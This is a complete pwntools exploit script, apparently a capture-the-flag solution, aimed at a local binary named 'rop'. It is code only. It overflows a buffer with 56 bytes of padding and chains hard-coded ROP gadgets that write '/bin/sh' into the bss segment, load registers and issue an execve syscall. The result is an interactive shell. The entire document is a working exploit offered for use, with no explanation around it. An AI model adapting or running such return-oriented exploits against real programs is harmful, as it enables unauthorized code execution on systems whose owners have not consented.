from pwn import *
context.arch = 'amd64'

p = process('./rop')

junk = b'a' * 56

pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004100f3
pop_rdx = 0x0000000000449935
mov_rdi_rdx = 0x00000000004356b3
pop_rax = 0x0000000000415714
syscall = 0x000000000040125c
bss = 0x006bc000-0x100

payload = junk
payload += p64(pop_rdi) + p64(bss) 
payload += p64(pop_rdx) + b'/bin/sh\x00' 
payload += p64(mov_rdi_rdx) 
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(59)
payload += p64(syscall)

p.sendlineafter(':D', payload)

p.interactive()